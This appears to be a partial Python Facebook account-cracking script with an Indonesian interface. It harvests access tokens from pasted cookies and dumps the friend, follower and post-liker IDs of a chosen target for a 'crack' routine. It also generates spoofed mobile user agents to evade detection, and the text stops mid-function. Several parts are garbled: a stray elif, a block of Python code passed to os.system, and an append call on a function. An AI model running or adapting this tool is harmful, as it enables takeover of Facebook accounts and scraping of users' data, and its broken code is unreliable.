""" REVERSED BY @BlueFox """

#!/usr/bin/python3
#-*-coding:utf-8-*-
# Made With By BLUEFOX

### Import Module
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess

from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from urllib.parse import quote

### Warna
P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
H = "\x1b[0;92m" # Hijau
K = "\x1b[0;93m" # Kuning
B = "\x1b[0;94m" # Biru
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # Biru Muda
N = "\033[0m"    # Warna Mati

### Host & Penampungan
host = "https://mbasic.facebook.com"
ok = []
cp = []
ttl = []

### Waktu & Tanggal
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
    if bu < 0 or bu > 12:
        exit()
    buTemp = bu - 1
except ValueError:
    exit()
op = bulan[buTemp]
tanggal = ("%s-%s-%s"%(ha,op,ta))

### User Agent
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

### Display Text
def jalan(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

### Clear Terminal
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")
    else:os.system("clear")

### Logoku
def banner():
    print("BlueFox-Mengkeren")
    print("JAN LUPA LAPORAN JAN MAKE DOANK KONTOL")
### Menu Login
def menu_log():
    os.system('rm -rf token.txt')
    clear()
    banner()
    var_menu()
    pmu = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
    print('')
    if pmu in ['']:
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
        menu_log()
    elif pmu in ['1','01','001','a']:
        defaultua()
        token = input('%s[%s•%s] %sToken : '%(K,P,K,P))
        try:
            x = requests.get("https://graph.facebook.com/me?access_token=" + token)
            y = json.loads(x.text)
            n = y['name']
            xd = open("token.txt", "w")
            xd.write(token)
            xd.close()
            #jalan('\n%s[%s!%s] %sLogin Successful'%(K,P,K,P))
            exit(bot_follow_premium.main())
            #menu()
        except (KeyError,IOError):
            jalan('\n%s[%s!%s] %sToken Invalid'%(M,P,M,P))
            os.system('rm -rf token.txt')
            menu_log()
        except requests.exceptions.ConnectionError:
            jalan('\n%s[%s!%s] %sConnection Error'%(M,P,M,P))
            exit()
    elif pmu in ['2','02','002','b']:
        defaultua()
        cookie = input('%s[%s•%s] %sCookies : '%(K,P,K,P))
        try:
            data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
            "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
            "referer"                   : "https://m.facebook.com/",
            "host"                      : "m.facebook.com",
            "origin"                    : "https://m.facebook.com",
            "upgrade-insecure-requests" : "1",
            "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control"             : "max-age=0",
            "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type"              : "text/html; charset=utf-8"
            }, cookies = {
            "cookie"                    : cookie
            })
            find_token = re.search("(EAAA\w+)", data.text)
            hasil = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
            xd = open("token.txt", "w")
            xd.write(find_token.group(1))
            xd.close()
            #jalan('\n%s[%s!%s] %sLogin Successful'%(K,P,K,P))
           
       
            #menu()
        except requests.exceptions.ConnectionError:
            jalan('\n%s[%s!%s] %sConnection Error'%(M,P,M,P))
            exit()
        except (KeyError,IOError,AttributeError):
            jalan('\n%s[%s!%s] %sCookies Invalid'%(M,P,M,P))
            os.system('rm -rf token.txt')
            menu_log()
    elif pmu in ['3','03','003','c']:
        clear()
        banner()
        var_tutor()
        pf = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
        print('')
    
        elif pf in ['4','04','004','d']:
            tutor_crack()
            input('%s[ %sBack %s]%s'%(K,P,K,P))
            menu_log()
        else:
            jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
            menu_log()
    elif pmu in ['4','04','004','d']:
        clear()
        banner()
       
      
        menu_log()
    elif pmu in ['0','00','000','e']:
        jalan('%s[%s!%s] %sThanks For Using My SC'%(K,P,K,P))
        jalan('%s[%s!%s] %sHave A Good Day :)\n'%(K,P,K,P))
        os.system('rm -rf token.txt')
        clear()
        exit()
    else:
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
        menu_log()

### Menu Utama
def menu():
    clear()
    banner()
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        kun = lisensi.split('-')
        users = wk['username']
        bergabung = wk['joined']
        kadaluarsa = wk['expired']
        status = ('%sPremium [%sPro%s]'%(K,P,K))
        kunci = ('%s%s%s-%s%s%s-%sXXXXX'%(K,kun[0],P,K,kun[1],P,K))
        pro = ''
        upgrade = 'Change License Key'
        jid = ''
    except (KeyError,IOError):
        status = 'Free User'
        users = '-'
        kunci = '-'
        bergabung = '-'
        kadaluarsa = '-'
        pro = ("%s[%sPro%s]"%(K,P,K))
        upgrade = ('Upgrade To %sPro'%(K))
        jid = ('%s[%s1500 ID%s]'%(K,P,K))
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
        i = y['id']
    except (KeyError,IOError):
        print('%s'%(M))
        jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        print('%s'%(M))
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    a = requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()
    try:
        ip = a["query"]
    except KeyError:
        ip = " "
    print('%s[ %sWelcome %s %s]'%(K,P,n,K))
    print('\n%s[%s•%s] %sID : %s'%(K,P,K,P,i))
    print('%s[%s•%s] %sIP : %s'%(K,P,K,P,ip))
    print('\n%s[%s•%s] %sStatus : %s'%(K,P,K,P,status))
    print('%s[%s•%s] %sName : %s'%(K,P,K,P,users))
    print('%s[%s•%s] %sKey : %s'%(K,P,K,P,kunci))
    print('%s[%s•%s] %sJoined : %s'%(K,P,K,P,bergabung))
    print('%s[%s•%s] %sExpired : %s'%(K,P,K,P,kadaluarsa))
    print('\n%s[%s1%s] %sCrack ID Friend/Public %s'%(K,P,K,P,jid))
    print('%s[%s2%s] %sCrack ID Followers %s'%(K,P,K,P,jid))
    print('%s[%s3%s] %sCrack ID Likers Post %s'%(K,P,K,P,jid))
    print('%s[%s4%s] %sGet Data Target'%(K,P,K,P))
    print('%s[%s5%s] %sDump Amount Of Friend %s'%(K,P,K,P,pro))
    print('%s[%s6%s] %sSee Result Crack'%(K,P,K,P))
    print('%s[%s7%s] %sCheck Option Result Crack %s'%(K,P,K,P,pro))
    print('%s[%s8%s] %sUser Agent'%(K,P,K,P))
    print('%s[%s9%s] %s%s'%(K,P,K,P,upgrade))
    print('%s[%s0%s] %sLog Out'%(K,P,K,P))
    pm = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
    print('')
    if pm in ['']:
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
        menu()
    elif pm in ['1','01','001','a']:
        publik()
    elif pm in ['2','02','002','b']:
        pengikut()
    elif pm in ['3','03','003','c']:
        likers()
    elif pm in ['4','04','004','d']:
        target()
    elif pm in ['5','05','005','e']:
        teman_target()
    elif pm in ['6','06','006','f']:
        hasil()
    elif pm in ['7','07','007','g']:
        cek_hasil()
    elif pm in ['8','08','008','h']:
        ugen()
    elif pm in ['9','09','009','i']:
        buy_license()
    elif pm in ['0','00','000','j']:
        jalan('%s[%s!%s] %sSampai Jumpa'%(K,P,K,P))
        os.system('rm -rf token.txt')
        menu_log()
    else:
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
        menu()

### User Agent Bawaan
def defaultua():
    ua = ua_xiaomi
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError,IOError):
        menu_log()

### Menu User Agent
def ugen():
    var_ugen()
    pmu = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
    print('')
    if pmu in[""]:
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
        menu()
    elif pmu in ['1','01','001','a']:
        os.system('for hhisn in range(10000):
    rr = random.randint
    rc = random.choice
    teuing = random.choice(["001","002","003","004","005","006","007","008","009","010","011","012","013","014","015","017","018","019","020","021","022","023","024","025","026","027","028","029","030"])
    samsung = random.choice(["SM-J320F", "SM-N975F", "SM-S918B", "SM-N986U", "SM-S908U", "SM-G991B", "SM-A528B", "SM-A536B", "SM-A146U", "SM-A037U", "SM-N975F", "SM-N960F", "SM-G960U", "SM-A202F", "SM-G965U", "YA-L29", "SM-A115U", "SM-S918B", "SM-F711B", "SM-A336B", "SM-G975U", "SM-N9860", "SM-N9860", "SM-G996U", "SM-G998U", "SM-A750GN", "SM-N770F", "SM-G900F", "SM-Z130H", "SM-G900F", "SM-G900F", "SM-T800", "SM-N900V", "SAMSUNG GT-I9515", "SM-T530NU", "SM-T530", "SM-Z130H", "SM-Z130H", "SM-G360T1", "SM-A800F", "SM-T530", "SM-G928F", "SM-G925F", "SM-T817T", "SM-T355Y", "SM-J200G", "SM-N915F", "SM-P901", "SM-G531H", "SM-J701M", "SM-J111F", "SM-J105Y", "SM-J120F", "SM-T550", "SM-Z200Y", "SM-J500FN", "SM-A800F", "SM-T280", "SM-J120H", "SM-A310F", "SM-T530", "SM-T331", "SM-A510F", "SM-S920L", "SM-G925F", "SM-T670", "SM-T670", "SM-G925F", "SM-Z200F", "SM-T585", "SM-T285", "SM-N976V", "SM-G977N", "SM-G975F", "SM-G970F", "SM-F900U", "SM-A805F", "SM-A505F", "SM-G350E", "SM-G350", "SM-G350E", "SM-J326AZ", "SM-J336AZ", "GT-P3100", "SM-A202F", "SM-A260F", "SM-A145R", "SM-A136B", "SM-A546B", "SM-A736B", "SM-A530F", "SM-G885F", "SM-A805F", "SM-A910F", "SM-G8850", "SM-G316MY", "SM-G318H", "SM-G850F", "SM-G386T", "GT-I5801", "SM-C7010", "SM-C9000", "EK-GC100", "SM-G355H", "SM-G350E", "SM-G360H", "SM-G361H", "SM-G361HU", "SM-G360BT", "SM-G360T", "SM-G360BT", "SM-G361H", "SM-G361", "GT-I8730", "SM-G1650", "SM-G1650", "SM-R810", "SM-R905U", "SM-R905N", "SM-J200BT", "SM-J200G", "SM-J337R4", "SM-J337U", "SM-J337W", "SM-J337A", "SM-J337R", "SM-S327VL", "SM-J330F", "SM-J327T1", "SM-N975U", "SM-A205F"])
    build = random.choice(['LRX22C','LRX22G','IML74K','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD','OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1','QKQ1','LMY48I','KTU84P','MRA58K','FRF91','SKQ1','OPM1','MMB29M','NRD90M'])
    merek = random.choice(['Redmi 10 5G','Redmi S2','Redmi Note 9S','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi Note 7 Pro','Redmi Note 7S','Redmi Note 8','Redmi Note 10 JE','Redmi Note 11 4G','Redmi Note 11T Pro','Redmi Note 11T Pro+','Redmi Note 11S 5G','Redmi Note 11 5G','Redmi 10','Redmi 1','Redmi Note 11','Redmi 10S','Redmi 10I','Redmi 10C','Redmi 10A','Redmi Note 1','Redmi Note 10','Redmi K50','Redmi 3X','Redmi 1S','Redmi 12C','Redmi 2A','Redmi 12','Redmi 6A','Redmi 5 Pro','Redmi 5 Plus','Redmi 5pro','Redmi 5A','Redmi 85781','Redmi 7i','Redmi 7 Pro','Redmi 7','Redmi 7A','Redmi 9A','Redmi 9T NFC','Redmi 9T','Redmi 9pro','Redmi 9C','Redmi Go','Redmi A8','Redmi A90','Redmi A2','MI MAX 2','Redmi A3','PDEM10','PCAM1','RMX3516', 'RMX3371', 'RMX3461', 'RMX3286', 'RMX3561', 'RMX3388', 'RMX3311', 'RMX3142', 'RMX2071', 'RMX1805', 'RMX1809', 'RMX1801', 'RMX1807', 'RMX1803', 'RMX1825', 'RMX1821', 'RMX1822', 'RMX1833', 'RMX1851', 'RMX1853', 'RMX1827', 'RMX1911', 'RMX1919', 'RMX1927', 'RMX1971', 'RMX1973', 'RMX2030', 'RMX2032', 'RMX1925', 'RMX1929', 'RMX2001', 'RMX2061', 'RMX2063', 'RMX2040', 'RMX2042', 'RMX2002', 'RMX2151', 'RMX2163', 'RMX2155', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3241', 'RMX3081', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3474', 'RMX3471', 'RMX3472', 'RMX3392', 'RMX3393', 'RMX3491', 'RMX1811', 'RMX2185', 'RMX3231', 'RMX2189', 'RMX2180', 'RMX2195', 'RMX2101', 'RMX1941', 'RMX1945', 'RMX3063', 'RMX3061', 'RMX3201', 'RMX3203', 'RMX3261', 'RMX3263', 'RMX3193', 'RMX3191', 'RMX3195', 'RMX3197', 'RMX3265', 'RMX3268', 'RMX3269','RMX2027', 'RMX2020', 'RMX2021', 'RMX3581', 'RMX3501', 'RMX3503', 'RMX3511', 'RMX3310', 'RMX3312', 'RMX3551', 'RMX3301', 'RMX3300', 'RMX2202', 'RMX3363', 'RMX3360', 'RMX3366', 'RMX3361', 'RMX3031','KFTT','KFTHWI','Redmi Note 4','Redmi Note 5','KFJWI',',KFOT','LG-L160L','SM-G530H','KFASWI','SM-A405FN','MEIZU 18s Pro','NTN-AN20','LeNumero1','LM-K310IM','Infinix X671','4188S','CPH2457','Moto X40 Pro','HIT P10a','Redmi Note 8 Pro','SM-A346M','SM-J415FN','SM-X706B','SM-J337R4','SM-A9000','SM-G532G','SM-J810M','SM-T280','M2012K11AG','Infinix X5514D','Meizu C10','Infinix X657C','Redmi S2','MI 8','Redmi Note 9 Pro','M2103K19PG','CPH2331','Redmi 5A','WOW64','Z970','Nexus One','itel S11','Intel Mac OS X','SM-G1998','POCO F2','Redmi 4AX676B'])
    kecap = random.choice(['zh-TW','es-es','pt-br','zh-cn','zh-CN','it-it','en-us','zh-tw','en-US','fa-ir','id-id'])
    andro = str(rc(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13']))
    lonte = ['TQ1A','MX44LN','TD1A','OPM4','TQ2A','QQ1B','RP1A','N7MWON','NK7T7Q','OPR4','LZASI7','RD1B','TP1A'] 
    oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    strvoppo = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(oppo))} Build/{str(rc(lonte))}){str(rr(1,210000))}  AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
    rohman = f'Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {kecap}; {merek} Build/{build}.{str(rr(111111,210000))}.{teuing}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36'
    rohman2 = f'Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {samsung} Build/{build}.{str(rr(111111,210000))}.{teuing}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36'
    rohman1 = f'Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {merek} Build/{build}.{str(rr(111111,210000))}.{teuing}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36'
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {merek} Build/{build}.{str(rr(111111,210000))}.{teuing}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u3 = f'Mozilla/5.0 (Linux; U; Viera; pt-BR) AppleWebKit/537.36 (KHTML, like Gecko) Viera/4.0.0 Chrome/{str(rr(30,150))}.0.{str(rr(2000,6500))}.{str(rr(50,250))} Safari/537.36 SmartTV'
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,15))}; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u0 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,300))}.0.0.0 Mobile Safari/537.36"
    uaku = random.choice([rohman,rohman1,rohman2,u2,strvoppo,u3,u1,u0])
    ugen.append(uaku)')
        input('%s[ %sBack %s]%s'%(K,P,K,P))
        menu()
    elif pmu in ['2','02','002','b']:
        os.system("rm -rf ugent.txt")
        ua = input("%s[%s•%s] %sInput User Agent : \n\n"%(K,P,K,P))
        try:
            ugent = open('ugent.txt','w')
            ugent.write(ua)
            ugent.close()
            jalan("\n%s[ %sSuccess Changed User Agent %s]"%(K,P,K))
            input('\n%s[ %sBack %s]%s'%(K,P,K,P))
            menu()
        except (KeyError,IOError):
            jalan("\n%s[ %sFailed To Change User Agent %s]"%(M,P,M))
            print('%s'%(M))
            input('%s[ %sBack %s]%s'%(M,P,M,P))
            menu()
    elif pmu in ['3','03','003','c']:
        ugen_hp()
    elif pmu in ['4','04','004','d']:
        os.system("rm -rf ugent.txt")
        jalan("%s[ %sSuccess Remove User Agent %s]"%(K,P,K))
        input('\n%s[ %sBack %s]%s'%(K,P,K,P))
        menu()
    elif pmu in ['5','05','005','e']:
        try:
            ungser = open('ugent.txt', 'r').read()
        except (KeyError,IOError):
            ungser = 'Not Found'
        print("%s[%s•%s] %sUser Agent Used : \n\n%s%s"%(K,P,K,P,K,ungser))
        jalan("\n%s[ %sThis Is Your User Agent Now %s]"%(K,P,K))
        input('\n%s[ %sBack %s]%s'%(K,P,K,P))
        menu()
    elif pmu in ['0','00','000','f']:
        menu()
    else:
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
def ugen_hp():
    os.system("rm -rf ugent.txt")
    print('%s[%s1%s] %sXiaomi'%(K,P,K,P))
    print('%s[%s2%s] %sNokia'%(K,P,K,P))
    print('%s[%s3%s] %sAsus'%(K,P,K,P))
    print('%s[%s4%s] %sHuawei'%(K,P,K,P))
    print('%s[%s5%s] %sVivo'%(K,P,K,P))
    print('%s[%s6%s] %sOppo'%(K,P,K,P))
    print('%s[%s7%s] %sSamsung'%(K,P,K,P))
    print('%s[%s8%s] %sWindows'%(K,P,K,P))
    pc = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
    print('')
    if pc in['']:jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P));menu()
    elif pc in ['1','01']:
        ugent = open('ugent.txt','w');ugent.write(ua_xiaomi);ugent.close()
    elif pc in ['2','02']:
        ugent = open('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
    elif pc in ['3','03']:
        ugent = open('ugent.txt','w');ugent.write(ua_asus);ugent.close()
    elif pc in ['4','04']:
        ugent = open('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
    elif pc in ['5','05']:
        ugent = open('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
    elif pc in ['6','06']:
        ugent = open('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
    elif pc in ['7','07']:
        ugent = open('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
    elif pc in ['8','08']:
        ugent = open('ugent.txt','w');ugent.write(ua_windows);ugent.close()
    else:jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P));menu()
    jalan("%s[ %sSuccess Changed User Agent %s]"%(K,P,K))
    input('\n%s[ %sBack %s]%s'%(K,P,K,P))
    menu()

### Dump ID
def publik():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        wj = wk['username']
        jid = '5000'
    except (KeyError,IOError):
        jid = '1500'
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    try:
        print('%s[%s•%s] %sType \'me\' To Get ID From Friendlist'%(K,P,K,P))
        it = input("%s[%s•%s] %sID Target : "%(K,P,K,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s[%s•%s] %sName : %s'%(K,P,K,P,ob['name']))
        except (KeyError,IOError):
            jalan('\n%s[%s!%s] %sID Not Found'%(M,P,M,P))
            menu()
        r = requests.get("https://graph.facebook.com/%s/friends?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s[%s•%s] %sTotal ID : %s'%(K,P,K,P,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s[%s!%s] %sError : %s'%(M,P,M,P,e))
def pengikut():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        wj = wk['username']
        jid = '10000'
    except (KeyError,IOError):
        jid = '1500'
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    try:
        print('%s[%s•%s] %sType \'me\' To Get ID From Friendlist'%(K,P,K,P))
        it = input("%s[%s•%s] %sID Target : "%(K,P,K,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s[%s•%s] %sName : %s'%(K,P,K,P,ob['name']))
        except (KeyError,IOError):
            jalan('\n%s[%s!%s] %sID Not Found'%(M,P,M,P))
            menu()
        r = requests.get("https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s[%s•%s] %sTotal ID : %s'%(K,P,K,P,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s[%s!%s] %sError : %s'%(M,P,M,P,e))
def likers():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        wj = wk['username']
        jid = '10000'
    except (KeyError,IOError):
        jid = '1500'
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
